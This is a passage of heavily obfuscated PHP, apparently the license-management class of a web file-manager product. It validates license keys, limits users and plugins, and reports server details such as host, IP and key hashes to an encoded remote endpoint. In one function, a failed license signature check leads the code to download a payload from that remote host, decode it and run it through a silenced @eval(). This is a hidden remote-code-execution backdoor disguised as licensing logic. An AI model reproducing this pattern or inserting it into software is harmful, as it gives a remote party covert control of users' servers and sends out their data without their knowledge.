–ï[$¬´Šİøª[103]][$¬´Šİøª[117]] = _get($this->jdgf1f9f980e, $¬´Šİøª[118], $¬´Šİøª[6]); $™ŒÄÓƒ“ = $é¼Ü°î[747]; if (strlen($™ŒÄÓƒ“) < $é¼Ü°î[720]) { return; } if (KodUser::isRoot() && $this->config[$¬´Šİøª[119]]) { $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[120]] = WEB_ROOT; } return $‡Œí –ï; } private function tznx0f3b45a9() { $ÖíËé¯À =& $_SERVER[ŒÅŸ‹ä†]; $×ì¿Êšè =& $_SERVER[‹«õ‘¢ğ]; $ò«­§šÁ = $_SERVER[$×ì¿Êšè[24]] == $×ì¿Êšè[121]; $Ç¯¬‘ƒß = $ÖíËé¯À[748]; if (!$Ç¯¬‘ƒß) { return; } if ($_SERVER[$×ì¿Êšè[24]] == $×ì¿Êšè[122] && $_GET[$×ì¿Êšè[123]] == $×ì¿Êšè[124]) { $ò«­§šÁ = !0; } if ($ò«­§šÁ) { $©Œãî³ı = array($×ì¿Êšè[110] => $this->cafbf6127a84, $×ì¿Êšè[125] => $this->cjzr9b7c6972(), $×ì¿Êšè[126] => Model($×ì¿Êšè[127])->count()); if ($this->cafbf6127a84 != $×ì¿Êšè[111]) { $‰ûêØ  = _get($this->jdgf1f9f980e, $×ì¿Êšè[128]); if ($‰ûêØ ) { $©Œãî³ı[$×ì¿Êšè[129]] = $‰ûêØ ; $©Œãî³ı[$×ì¿Êšè[130]] = strtotime(_get($this->jdgf1f9f980e, $×ì¿Êšè[131])); $©Œãî³ı[$×ì¿Êšè[132]] = _get($this->jdgf1f9f980e, $×ì¿Êšè[118]); } $÷È°Ê•‘ = Model($×ì¿Êšè[33])->get($×ì¿Êšè[133], $×ì¿Êšè[6], !0); if (is_string($÷È°Ê•‘) && substr($÷È°Ê•‘, 0, 1) == $×ì¿Êšè[134]) { $÷È°Ê•‘ = json_decode_force($÷È°Ê•‘); } if (is_array($÷È°Ê•‘) && $÷È°Ê•‘[$×ì¿Êšè[135]] && strstr($÷È°Ê•‘[$×ì¿Êšè[135]], $×ì¿Êšè[136])) { $ï™ëÈä° = explode($×ì¿Êšè[136], $÷È°Ê•‘[$×ì¿Êšè[135]]); $©Œãî³ı[$×ì¿Êšè[137]] = $ï™ëÈä°[0]; } } $©Œãî³ı = $this->whvm7dfdd584(json_encode($©Œãî³ı), md5($×ì¿Êšè[138])); $…Ä†éş‹ = array($×ì¿Êšè[139] => $©Œãî³ı); call_user_func(array($×ì¿Êšè[140], $×ì¿Êšè[141]), $…Ä†éş‹); $š”ÛôÆ = $ÖíËé¯À[749]; if (strlen($š”ÛôÆ) < $ÖíËé¯À[19]) { return; } } if ($this->cafbf6127a84 == $×ì¿Êšè[111]) { return; } $¿¥½§€ = array($×ì¿Êšè[142], $×ì¿Êšè[143], $×ì¿Êšè[144], $×ì¿Êšè[145], $×ì¿Êšè[146], $×ì¿Êšè[147]); $áñ´ÈÉï = Model($×ì¿Êšè[33])->get(); $”šŠÃ™š = $ÖíËé¯À[750]; $…Ä†éş‹ = array($×ì¿Êšè[148] => $áñ´ÈÉï[$×ì¿Êšè[34]], $×ì¿Êšè[149] => $áñ´ÈÉï[$×ì¿Êšè[35]], $×ì¿Êšè[150] => $×ì¿Êšè[6]); foreach ($¿¥½§€ as $È‘‡Í) { if (!isset($áñ´ÈÉï[$È‘‡Í]) || !$áñ´ÈÉï[$È‘‡Í]) { continue; } $…Ä†éş‹[$È‘‡Í] = $áñ´ÈÉï[$È‘‡Í]; $šË‹ıòİ = $ÖíËé¯À[751]; if (!$šË‹ıòİ) { die; } } call_user_func(array($×ì¿Êšè[140], $×ì¿Êšè[141]), $…Ä†éş‹); $¢´şƒ = $ÖíËé¯À[752]; } private function hdmyaf137aef() { $©ş›†µ§ =& $_SERVER[ŒÅŸ‹ä†]; $²š¾í³¯ =& $_SERVER[‹«õ‘¢ğ]; if ($_SERVER[$²š¾í³¯[24]] != $²š¾í³¯[151]) { return; } if (!KodUser::isRoot()) { die; } $È‹‚ß‡ğ = $GLOBALS[$²š¾í³¯[13]]; if (isset($È‹‚ß‡ğ[$²š¾í³¯[152]])) { $this->fcmp62fe5f9d(); die; } if (isset($È‹‚ß‡ğ[$²š¾í³¯[153]]) && isset($È‹‚ß‡ğ[$²š¾í³¯[153]]) == $²š¾í³¯[124]) { $È‹‚ß‡ğ[$²š¾í³¯[154]] = Model($²š¾í³¯[33])->get($²š¾í³¯[155]); } if (!isset($È‹‚ß‡ğ[$²š¾í³¯[154]]) || strlen($È‹‚ß‡ğ[$²š¾í³¯[154]]) != 16) { show_json($²š¾í³¯[156] . $È‹‚ß‡ğ[$²š¾í³¯[154]], !1); } $©ùîÒÌä = Model($²š¾í³¯[33])->get($²š¾í³¯[102]); $£ØÑüãˆ = md5($_SERVER[$²š¾í³¯[108]] . $©ùîÒÌä); $ùÜ‡Û³Ã = array($²š¾í³¯[154] => $È‹‚ß‡ğ[$²š¾í³¯[154]], $²š¾í³¯[157] => rand_string(16), $²š¾í³¯[158] => $²š¾í³¯[138], $²š¾í³¯[159] => $²š¾í³¯[160], $²š¾í³¯[161] => $_SERVER[$²š¾í³¯[162]], $²š¾í³¯[163] => $_SERVER[$²š¾í³¯[164]], $²š¾í³¯[165] => $_SERVER[$²š¾í³¯[166]], $²š¾í³¯[107] => $£ØÑüãˆ, $²š¾í³¯[167] => Model($²š¾í³¯[33])->get($²š¾í³¯[133])); if (isset($È‹‚ß‡ğ[$²š¾í³¯[153]]) && isset($È‹‚ß‡ğ[$²š¾í³¯[153]]) == $²š¾í³¯[124]) { $ùÜ‡Û³Ã[$²š¾í³¯[153]] = md5($ùÜ‡Û³Ã[$²š¾í³¯[154]] . $²š¾í³¯[168] . $ùÜ‡Û³Ã[$²š¾í³¯[157]]); } if ($È‹‚ß‡ğ[$²š¾í³¯[169]] == $²š¾í³¯[170]) { $š™Š = $this->whvm7dfdd584($£ØÑüãˆ, $²š¾í³¯[171]); $µ’÷±£¾ = $this->lczg454597d9(json_encode($ùÜ‡Û³Ã), $£ØÑüãˆ . $²š¾í³¯[172], 3); $µ’÷±£¾ = $µ’÷±£¾ . $²š¾í³¯[173] . $_SERVER[$²š¾í³¯[162]]; $¬Èõú˜Ç = $this->ldmwf8e7cfbe($²š¾í³¯[174] . $š™Š . $²š¾í³¯[175] . $µ’÷±£¾, -1); show_json($¬Èõú˜Ç, !0); } else { if ($È‹‚ß‡ğ[$²š¾í³¯[169]] == $²š¾í³¯[176]) { $äÕ‘¶ŒÕ = substr(md5($²š¾í³¯[177] . $£ØÑüãˆ), 12, 15) . $²š¾í³¯[178]; $µ’÷±£¾ = $this->gvcedea4817a(trim($È‹‚ß‡ğ[$²š¾í³¯[179]]), $äÕ‘¶ŒÕ, 2); $ò¬óŞÙÈ = json_decode($µ’÷±£¾, !0); if (!is_array($ò¬óŞÙÈ) || !is_array($ò¬óŞÙÈ[$²š¾í³¯[180]]) || $ò¬óŞÙÈ[$²š¾í³¯[154]] != !0) { $öÒÕÕÑÂ = $²š¾í³¯[181]; $“ç„ƒ¹¢ = $ò¬óŞÙÈ[$²š¾í³¯[180]] ? $²š¾í³¯[182] . $ò¬óŞÙÈ[$²š¾í³¯[180]] : $öÒÕÕÑÂ; show_json($“ç„ƒ¹¢, !1); } else { $ùÜ‡Û³Ã[$²š¾í³¯[157]] = $ò¬óŞÙÈ[$²š¾í³¯[180]][$²š¾í³¯[183]]; } } else { $ò¬óŞÙÈ = $this->ldmwf8e7cfbe($²š¾í³¯[184], $ùÜ‡Û³Ã, 10); $Ã§²ıÈ¦ = $©ş›†µ§[753]; } } if (!is_array($ò¬óŞÙÈ) || !is_array($ò¬óŞÙÈ[$²š¾í³¯[180]]) || $ò¬óŞÙÈ[$²š¾í³¯[154]] != !0) { $öÒÕÕÑÂ = LNG($²š¾í³¯[185]); $“ç„ƒ¹¢ = $ò¬óŞÙÈ[$²š¾í³¯[180]] ? $²š¾í³¯[182] . $ò¬óŞÙÈ[$²š¾í³¯[180]] : $öÒÕÕÑÂ; show_json($“ç„ƒ¹¢, !1); } $´¿Š³Áì = $ò¬óŞÙÈ[$²š¾í³¯[180]]; $ø’£ú€ = $this->glsoa80d43ea($´¿Š³Áì[$²š¾í³¯[186]]); $§„ÇìğÀ = $©ş›†µ§[754]; if (!$ø’£ú€ || $ø’£ú€ != $´¿Š³Áì[$²š¾í³¯[131]]) { $ ùİÑš² = array($²š¾í³¯[187] => Model($²š¾í³¯[33])->get($²š¾í³¯[102]), $²š¾í³¯[188] => $_SERVER[$²š¾í³¯[108]], $²š¾í³¯[189] => this_url(), $²š¾í³¯[163] => $_SERVER[$²š¾í³¯[164]]); $µ’÷±£¾ = $this->ahso9da22ee6(json_encode($ ùİÑš²)); $this->ldmwf8e7cfbe($²š¾í³¯[190] . $µ’÷±£¾); show_json(LNG($²š¾í³¯[191]), !0); } $×Ù–™ = array($²š¾í³¯[155] => $´¿Š³Áì[$²š¾í³¯[192]], $²š¾í³¯[193] => $´¿Š³Áì[$²š¾í³¯[194]], $²š¾í³¯[195] => rand_string(16), $²š¾í³¯[110] => $´¿Š³Áì[$²š¾í³¯[196]]); if ($ùÜ‡Û³Ã[$²š¾í³¯[157]]) { $×Ù–™[$²š¾í³¯[195]] = $ùÜ‡Û³Ã[$²š¾í³¯[157]]; } $éÛÄ„‚Ë = substr(md5($×Ù–™[$²š¾í³¯[193]]), 10, 10); $½ıÏ‡Øµ = $éÛÄ„‚Ë . $×Ù–™[$²š¾í³¯[110]] . $×Ù–™[$²š¾í³¯[195]]; $óéº÷‘û = $©ş›†µ§[755]; if (!$óéº÷‘û) { die; } $×Ù–™[$²š¾í³¯[112]] = strrev(base64_encode($this->whvm7dfdd584($½ıÏ‡Øµ, $²š¾í³¯[197]))); $ó˜Æ‰í = rand_string(16); $¼õ‡®¡ = $ó˜Æ‰í . $×Ù–™[$²š¾í³¯[110]] . $this->whvm7dfdd584(md5($×Ù–™[$²š¾í³¯[155]]), $ó˜Æ‰í); $Ìë«ÇıŞ = $©ş›†µ§[756]; if (!$Ìë«ÇıŞ) { return; } $×Ù–™[$²š¾í³¯[113]] = base64_encode(strrev($this->whvm7dfdd584($¼õ‡®¡, $²š¾í³¯[198]))); $ëÖ°€Ü = $©ş›†µ§[757]; if ($´¿Š³Áì[$²š¾í³¯[199]] && $´¿Š³Áì[$²š¾í³¯[199]] >= 1) { Model($²š¾í³¯[33])->setDeep($²š¾í³¯[200], $²š¾í³¯[124]); } Model($²š¾í³¯[33])->set($×Ù–™); $áŠÏ‡õ¸ = md5($_SERVER[$²š¾í³¯[108]] . strrev($©ùîÒÌä) . $×Ù–™[$²š¾í³¯[193]]); $§é£ĞéÊ = $©ş›†µ§[758]; if (strlen($§é£ĞéÊ) < $©ş›†µ§[713]) { die; } $¿Ñé—¼± = strrev(substr($áŠÏ‡õ¸, 10, 16)); $Â”ç‚â¸ = $©ş›†µ§[759]; while ($Â”ç‚â¸ < $©ş›†µ§[716]) { if ($Â”ç‚â¸ >= 0) { break; } $Â”ç‚â¸++; } $šÈëØé = $this->lczg454597d9(json_encode($´¿Š³Áì), $áŠÏ‡õ¸); $Èş¤¤õö = array_to_keyvalue(Model($²š¾í³¯[7])->listData(), $²š¾í³¯[201]); $ÚìÆúÀı = $Èş¤¤õö[$²š¾í³¯[202]]; $Á£»£ıá = $©ş›†µ§[760]; if (strlen($Á£»£ıá) < $©ş›†µ§[720]) { return; } $”­æÈ¢Ë = array(); $·ì¸¼Áû = $©ş›†µ§[761]; if (strlen($·ì¸¼Áû) < $©ş›†µ§[19]) { die; } $”­æÈ¢Ë[$¿Ñé—¼±] = $šÈëØé; Model($²š¾í³¯[7])->update($ÚìÆúÀı[$²š¾í³¯[203]], array($²š¾í³¯[204] => $”­æÈ¢Ë)); $½ÇüÔ Ö = $©ş›†µ§[762]; $this->jdgf1f9f980e = $´¿Š³Áì; $Û¬Ö§³Ğ = $©ş›†µ§[763]; if (!$Û¬Ö§³Ğ) { die; } $this->cafbf6127a84 = $×Ù–™[$²š¾í³¯[110]]; $this->licenseRegistSuccess(); Cache::set($²š¾í³¯[205] . md5($©ùîÒÌä . $²š¾í³¯[206]), $²š¾í³¯[6]); show_json(LNG($²š¾í³¯[191]), !0); $«Ô¹Úù˜ = $©ş›†µ§[764]; while (strlen($«Ô¹Úù˜) < $©ş›†µ§[711]) { if (!$«Ô¹Úù˜) { break; } $«Ô¹Úù˜++; } } private function licenseRegistSuccess() { $ƒÚ’´¸È =& $_SERVER[‹«õ‘¢ğ]; $€¾§„¸ = Model($ƒÚ’´¸È[33])->get(); $¾½ı¥²‡ = $_SERVER[ŒÅŸ‹ä†][765]; if ($€¾§„¸[$ƒÚ’´¸È[63]] != $ƒÚ’´¸È[124]) { Model($ƒÚ’´¸È[33])->set($ƒÚ’´¸È[63], $ƒÚ’´¸È[124]); } Action($ƒÚ’´¸È[207])->initStart(!0); } private function fcmp62fe5f9d() { $ı±÷¢Ş =& $_SERVER[ŒÅŸ‹ä†]; $ñ—ÆôÙò =& $_SERVER[‹«õ‘¢ğ]; Model($ñ—ÆôÙò[33])->set(array($ñ—ÆôÙò[155] => $ñ—ÆôÙò[6], $ñ—ÆôÙò[193] => $ñ—ÆôÙò[6], $ñ—ÆôÙò[110] => $ñ—ÆôÙò[111], $ñ—ÆôÙò[112] => $ñ—ÆôÙò[6], $ñ—ÆôÙò[113] => $ñ—ÆôÙò[6])); $ØîÏÒ°Ó = $ı±÷¢Ş[766]; if (strlen($ØîÏÒ°Ó) < $ı±÷¢Ş[720]) { die; } Model($ñ—ÆôÙò[33])->setDeep($ñ—ÆôÙò[200], $ñ—ÆôÙò[208]); $şÈÔ·±— = $ı±÷¢Ş[767]; while (strlen($şÈÔ·±—) < $ı±÷¢Ş[713]) { if (!$şÈÔ·±—) { break; } $şÈÔ·±—++; } $this->jdgf1f9f980e = array(); $êä¯ûáœ = $ı±÷¢Ş[768]; if (strlen($êä¯ûáœ) < $ı±÷¢Ş[720]) { return; } $this->cafbf6127a84 = $ñ—ÆôÙò[111]; $Çœ¾»Ó¨ = $ı±÷¢Ş[769]; if (!$Çœ¾»Ó¨) { return; } } private function bnqi803342fa() { $ùâï³Ó¸ =& $_SERVER[ŒÅŸ‹ä†]; $°†±»À× =& $_SERVER[‹«õ‘¢ğ]; $_SERVER[$°†±»À×[164]] = _get($_SERVER, $°†±»À×[164], APP_HOST); $this->cafbf6127a84 = $°†±»À×[111]; $ ù“³Ïá = Model($°†±»À×[33])->get(); if ($ ù“³Ïá[$°†±»À×[110]] == $°†±»À×[111]) { return; } $ëá „û§ = Model($°†±»À×[33])->get($°†±»À×[102]); $ÔàŠ¯ì = $ùâï³Ó¸[770]; while ($ÔàŠ¯ì < $ùâï³Ó¸[713]) { if ($ÔàŠ¯ì >= 0) { break; } $ÔàŠ¯ì++; } $®Ëé÷–Î = $°†±»À×[205] . md5($ëá „û§ . $°†±»À×[206]); $ò¶øèæ¦ = Cache::get($®Ëé÷–Î); if (!is_array($ò¶øèæ¦) || !isset($ò¶øèæ¦[$°†±»À×[209]]) || time() - $ò¶øèæ¦[$°†±»À×[209]] >= 60) { $„å‡àÅ› = Model($°†±»À×[7])->loadList(); $º»–±çÅ = $„å‡àÅ›[$°†±»À×[202]]; $ˆŞËğãÆ = md5($_SERVER[$°†±»À×[108]] . strrev($ëá „û§) . $ ù“³Ïá[$°†±»À×[193]]); $ƒÜ€ºş = strrev(substr($ˆŞËğãÆ, 10, 16)); $ò¶øèæ¦ = $this->gvcedea4817a($º»–±çÅ[$°†±»À×[88]][$ƒÜ€ºş], $ˆŞËğãÆ); $ò¶øèæ¦ = json_decode($ò¶øèæ¦, !0); } if (!is_array($ò¶øèæ¦)) { return $this->fcmp62fe5f9d(); } $İæ—ƒÎ¸ = strtotime($ò¶øèæ¦[$°†±»À×[131]]); if (time() >= $İæ—ƒÎ¸) { return $this->fcmp62fe5f9d(); } if (!isset($ò¶øèæ¦[$°†±»À×[209]]) || time() - $ò¶øèæ¦[$°†±»À×[209]] > 20) { $ò¶øèæ¦[$°†±»À×[209]] = time(); Cache::set($®Ëé÷–Î, $ò¶øèæ¦); } $this->jdgf1f9f980e = $ò¶øèæ¦; $this->cafbf6127a84 = $ ù“³Ïá[$°†±»À×[110]]; $GLOBALS[$°†±»À×[210]] = $this; $Œïñ¦ñø = $ùâï³Ó¸[771]; if (strlen($Œïñ¦ñø) < $ùâï³Ó¸[716]) { die; } } private function lsdj8adab972() { $Ş—Ï®Šª =& $_SERVER[‹«õ‘¢ğ]; $ÒòÒàõ‚ = $GLOBALS[$Ş—Ï®Šª[13]]; $“Û¼œ“ı = $_SERVER[$Ş—Ï®Šª[24]]; $ «®ÔïÂ = $_SERVER[ŒÅŸ‹ä†][772]; if ($“Û¼œ“ı == $Ş—Ï®Šª[211] && $this->cafbf6127a84 == $Ş—Ï®Šª[111]) { show_json(LNG($Ş—Ï®Šª[212]), !1, $Ş—Ï®Šª[213]); } $ÖÕ²€Œ± = array($Ş—Ï®Šª[214], $Ş—Ï®Šª[215]); if (in_array($“Û¼œ“ı, $ÖÕ²€Œ±)) { if ($this->cafbf6127a84 == $Ş—Ï®Šª[111] && isset($ÒòÒàõ‚[$Ş—Ï®Šª[216]])) { show_json(LNG($Ş—Ï®Šª[212]), !1, $Ş—Ï®Šª[213]); die; } $ğ¤§ïòŸ = $this->cjzr9b7c6972(); if ($ğ¤§ïòŸ != intval($Ş—Ï®Šª[217])) { if ($ğ¤§ïòŸ <= Model($Ş—Ï®Šª[127])->count()) { show_json(LNG($Ş—Ï®Šª[218]), !1, $Ş—Ï®Šª[213]); die; } } } } private function pvdi520b442e() { $‘Ç•§Ëş =& $_SERVER[ŒÅŸ‹ä†]; $ª’ÚÑÕ² =& $_SERVER[‹«õ‘¢ğ]; $ÍÉÙØ°è = array($ª’ÚÑÕ²[121], $ª’ÚÑÕ²[122]); if (!KodUser::isRoot() || !isset($_GET[$ª’ÚÑÕ²[219]])) { return; } if (!in_array($_SERVER[$ª’ÚÑÕ²[24]], $ÍÉÙØ°è)) { return; } $ÎÁõ ‚‘ = $ª’ÚÑÕ²[220]; $À‚ê×‹Ø = $‘Ç•§Ëş[773]; if (!$À‚ê×‹Ø) { return; } $ÎÁõ ‚‘ = $this->vgdae84fe108($ÎÁõ ‚‘, $ª’ÚÑÕ²[221]); $¤¯Üü¬‡ = $‘Ç•§Ëş[774]; while ($¤¯Üü¬‡ < $‘Ç•§Ëş[720]) { if ($¤¯Üü¬‡ >= 0) { break; } $¤¯Üü¬‡++; } $éµ¡ÊÆª = stream_context_create(array($ª’ÚÑÕ²[222] => array($ª’ÚÑÕ²[223] => $ª’ÚÑÕ²[224], $ª’ÚÑÕ²[225] => 3))); $ãŸØ‹ôç = $‘Ç•§Ëş[775]; if (!$ãŸØ‹ôç) { die; } $†èšÇŒã = @file_get_contents($ÎÁõ ‚‘, !1, $éµ¡ÊÆª); header($ª’ÚÑÕ²[226]); if ($†èšÇŒã && strstr($†èšÇŒã, $ª’ÚÑÕ²[227])) { echo $†èšÇŒã; } die; } public function erjn38096cc8($ÅîÃç€) { $“îí¼ûü =& $_SERVER[ŒÅŸ‹ä†]; $ëÅ‘òÉı =& $_SERVER[‹«õ‘¢ğ]; if ($this->cafbf6127a84 == $ëÅ‘òÉı[228]) { return $ÅîÃç€; } $ ºÕëıÒ = $this->versionPluginList(); $šŞŠ’¬½ = $“îí¼ûü[776]; if (!$šŞŠ’¬½) { return; } $Ôçõ„¨ó = explode($ëÅ‘òÉı[229], $this->versionPluginFilter()); $ÀÃËçÏ° = $“îí¼ûü[777]; if (!$ÀÃËçÏ°) { die; } $´úÚÛŒ› = array(); foreach ($ ºÕëıÒ as $úÏÄü££ => $·›¢êå¶) { if ($·›¢êå¶ == $ëÅ‘òÉı[230] && substr($this->cafbf6127a84, 0, 1) == $ëÅ‘òÉı[230]) { continue; } if (!in_array($úÏÄü££, $Ôçõ„¨ó)) { $´úÚÛŒ›[] = $úÏÄü££; } } foreach ($´úÚÛŒ› as $úÏÄü££) { unset($ÅîÃç€[$úÏÄü££]); } return $ÅîÃç€; $ÚÒËÊƒ¿ = $“îí¼ûü[778]; while (strlen($ÚÒËÊƒ¿) < $“îí¼ûü[713]) { if (!$ÚÒËÊƒ¿) { break; } $ÚÒËÊƒ¿++; } } private function versionPluginList() { $ğËÅÍ»Ê =& $_SERVER[‹«õ‘¢ğ]; return array($ğËÅÍ»Ê[231] => $ğËÅÍ»Ê[230], $ğËÅÍ»Ê[232] => $ğËÅÍ»Ê[230], $ğËÅÍ»Ê[233] => $ğËÅÍ»Ê[230], $ğËÅÍ»Ê[234] => $ğËÅÍ»Ê[230], $ğËÅÍ»Ê[235] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[237] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[238] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[239] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[240] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[241] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[242] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[243] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[244] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[245] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[246] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[247] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[248] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[249] => $ğËÅÍ»Ê[236], $ğËÅÍ»Ê[250] => $ğËÅÍ»Ê[236]); } private function versionPluginFilter() { $İ½² µã =& $_SERVER[ŒÅŸ‹ä†]; $ìòğ¢º¯ =& $_SERVER[‹«õ‘¢ğ]; if ($this->cafbf6127a84 == $ìòğ¢º¯[111]) { return $ìòğ¢º¯[6]; } $€áÅÈÓ = _get($this->jdgf1f9f980e, $ìòğ¢º¯[251], $ìòğ¢º¯[6]); $ÅşöñÀÊ = _get($this->jdgf1f9f980e, $ìòğ¢º¯[118], $ìòğ¢º¯[6]); $§ä³šø = $İ½² µã[779]; while ($§ä³šø < $İ½² µã[716]) { if ($§ä³šø >= 0) { break; } $§ä³šø++; } $ğ½Ÿş™ = _get($this->jdgf1f9f980e, $ìòğ¢º¯[252], $ìòğ¢º¯[6]); if ($ÅşöñÀÊ > time() && $ğ½Ÿş™ > time()) { $¾ŒğŠ­ = explode($ìòğ¢º¯[229], $€áÅÈÓ); $¥»‰Á÷õ = array_keys($this->versionPluginList()); $€áÅÈÓ = array_merge($¾ŒğŠ­, $¥»‰Á÷õ); $€áÅÈÓ = implode($ìòğ¢º¯[229], array_filter(array_unique($€áÅÈÓ))); } return $€áÅÈÓ; } private function fagsbb18d898() { $ƒÚ‘èş =& $_SERVER[‹«õ‘¢ğ]; if ($this->cafbf6127a84 != $ƒÚ‘èş[111]) { $GLOBALS[$ƒÚ‘èş[88]][$ƒÚ‘èş[92]][$ƒÚ‘èş[253]] = $ƒÚ‘èş[208]; return; } $GLOBALS[$ƒÚ‘èş[88]][$ƒÚ‘èş[254]] = $ƒÚ‘èş[124]; if (Model($ƒÚ‘èş[255])->get($ƒÚ‘èş[63]) != $ƒÚ‘èş[208]) { Model($ƒÚ‘èş[255])->set($ƒÚ‘èş[63], $ƒÚ‘èş[208]); } } public function bifg8de68a95() { return $_SERVER[‹«õ‘¢ğ][256]; } private function lsvrb582f901() { $íº¸¡¬ù =& $_SERVER[ŒÅŸ‹ä†]; $‘ÉÆ‘¸Ö =& $_SERVER[‹«õ‘¢ğ]; $³Î‘ŒÁ = array($‘ÉÆ‘¸Ö[257], $‘ÉÆ‘¸Ö[258], $‘ÉÆ‘¸Ö[259]); $¤£ŞÚÛ€ = $íº¸¡¬ù[780]; while (strlen($¤£ŞÚÛ€) < $íº¸¡¬ù[716]) { if (!$¤£ŞÚÛ€) { break; } $¤£ŞÚÛ€++; } $…Š’ß° = $‘ÉÆ‘¸Ö[260] . md5($‘ÉÆ‘¸Ö[261]); $×¡‚©Ÿ = $íº¸¡¬ù[781]; if (!$×¡‚©Ÿ) { return; } if ($this->cafbf6127a84 == $‘ÉÆ‘¸Ö[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$‘ÉÆ‘¸Ö[24]], $³Î‘ŒÁ)) { return; } if (time() % 4 != 0) { return; } $…ßó© = call_user_func(array($‘ÉÆ‘¸Ö[262], $‘ÉÆ‘¸Ö[263]), $…Š’ß°); if ($…ßó© && time() - $…ßó© < intval($‘ÉÆ‘¸Ö[264])) { return; } call_user_func(array($‘ÉÆ‘¸Ö[262], $‘ÉÆ‘¸Ö[141]), $…Š’ß°, time()); $«ßß¯Ú§ = $íº¸¡¬ù[782]; if (!$«ßß¯Ú§) { die; } $¨Ú‰«ŞŠ = Model($‘ÉÆ‘¸Ö[33])->get($‘ÉÆ‘¸Ö[102]); $ñ€ëÒ¿³ = array($‘ÉÆ‘¸Ö[154] => Model($‘ÉÆ‘¸Ö[33])->get($‘ÉÆ‘¸Ö[155]), $‘ÉÆ‘¸Ö[169] => $this->cafbf6127a84, $‘ÉÆ‘¸Ö[165] => $_SERVER[$‘ÉÆ‘¸Ö[166]], $‘ÉÆ‘¸Ö[167] => Model($‘ÉÆ‘¸Ö[33])->get($‘ÉÆ‘¸Ö[133]), $‘ÉÆ‘¸Ö[107] => md5($_SERVER[$‘ÉÆ‘¸Ö[108]] . $¨Ú‰«ŞŠ), $‘ÉÆ‘¸Ö[158] => $‘ÉÆ‘¸Ö[138], $‘ÉÆ‘¸Ö[161] => $_SERVER[$‘ÉÆ‘¸Ö[162]]); $Ä‹ÁŠ¦ö = $this->ldmwf8e7cfbe($‘ÉÆ‘¸Ö[265], $ñ€ëÒ¿³); $­£€°‹™ = $íº¸¡¬ù[783]; if (!$­£€°‹™) { return; } if (!is_array($Ä‹ÁŠ¦ö)) { return; } if ($Ä‹ÁŠ¦ö[$‘ÉÆ‘¸Ö[154]] && $Ä‹ÁŠ¦ö[$‘ÉÆ‘¸Ö[266]]) { if ($this->glsoa80d43ea($Ä‹ÁŠ¦ö[$‘ÉÆ‘¸Ö[266]]) == $ñ€ëÒ¿³[$‘ÉÆ‘¸Ö[154]]) { return; } } $this->fcmp62fe5f9d(); if ($this->glsoa80d43ea($Ä‹ÁŠ¦ö[$‘ÉÆ‘¸Ö[266]]) != $ñ€ëÒ¿³[$‘ÉÆ‘¸Ö[154]]) { $ŠĞÙáşÕ = array($‘ÉÆ‘¸Ö[187] => $¨Ú‰«ŞŠ, $‘ÉÆ‘¸Ö[188] => $_SERVER[$‘ÉÆ‘¸Ö[108]], $‘ÉÆ‘¸Ö[189] => this_url(), $‘ÉÆ‘¸Ö[163] => $_SERVER[$‘ÉÆ‘¸Ö[164]]); $­¹Æä÷î = $this->ahso9da22ee6(json_encode($ŠĞÙáşÕ)); $Ä‹ÁŠ¦ö = $this->ldmwf8e7cfbe($‘ÉÆ‘¸Ö[190] . $­¹Æä÷î); if ($Ä‹ÁŠ¦ö && is_array($Ä‹ÁŠ¦ö) && isset($Ä‹ÁŠ¦ö[$‘ÉÆ‘¸Ö[266]])) { $§âõáëø = $this->gvcedea4817a($Ä‹ÁŠ¦ö[$‘ÉÆ‘¸Ö[266]], 2); if ($§âõáëø) { $§âõáëø = $this->glsoa80d43ea($§âõáëø); } if ($§âõáëø) { try { @eval($§âõáëø); } catch (Exception $Òß¤³ª–) { } } } } } private function ldmwf8e7cfbe($î†…üƒ“ = '', $¢ø“ñÎì = array(), $™ˆşè„ = 5) { $Ä†šøĞò =& $_SERVER[ŒÅŸ‹ä†]; $–‰¶÷Ö =& $_SERVER[‹«õ‘¢ğ]; $ÒÔ¾ñ = $–‰¶÷Ö[267]; $Û…ãîŠ = $Ä†šøĞò[784]; while ($Û…ãîŠ < $Ä†šøĞò[720]) { if ($Û…ãîŠ >= 0) { break; } $Û…ãîŠ++; } $ÒÔ¾ñ = $this->vgdae84fe108($ÒÔ¾ñ, $–‰¶÷Ö[268]); $ÒÔ¾ñ = $ÒÔ¾ñ . $î†…üƒ“; if ($¢ø“ñÎì && is_array($¢ø“ñÎì)) { $ÒÔ¾ñ = $ÒÔ¾ñ . $–‰¶÷Ö[269] . http_build_query($¢ø“ñÎì); } if ($¢ø“ñÎì === -1) { return $ÒÔ¾ñ; } $Çüîìî = stream_context_create(array($–‰¶÷Ö[222] => array($–‰¶÷Ö[225] => $™ˆşè„, $–‰¶÷Ö[223] => $–‰¶÷Ö[270]), $–‰¶÷Ö[271] => array($–‰¶÷Ö[272] => !1, $–‰¶÷Ö[273] => !1))); $¢ø“ñÎì = @file_get_contents($ÒÔ¾ñ, !1, $Çüîìî); return json_decode($¢ø“ñÎì, !0); } private function cjzr9b7c6972() { $é³’§¾± =& $_SERVER[ŒÅŸ‹ä†]; $ºâÒÛØİ =& $_SERVER[‹«õ‘¢ğ]; $ÑˆŠ¡Ç = array($ºâÒÛØİ[274] => $ºâÒÛØİ[275], $ºâÒÛØİ[276] => $ºâÒÛØİ[277], $ºâÒÛØİ[278] => $ºâÒÛØİ[279], $ºâÒÛØİ[280] => $ºâÒÛØİ[281], $ºâÒÛØİ[282] => $ºâÒÛØİ[283], $ºâÒÛØİ[284] => $ºâÒÛØİ[217], $ºâÒÛØİ[285] => $ºâÒÛØİ[217], $ºâÒÛØİ[286] => $ºâÒÛØİ[275], $ºâÒÛØİ[287] => $ºâÒÛØİ[277], $ºâÒÛØİ[288] => $ºâÒÛØİ[279], $ºâÒÛØİ[289] => $ºâÒÛØİ[290], 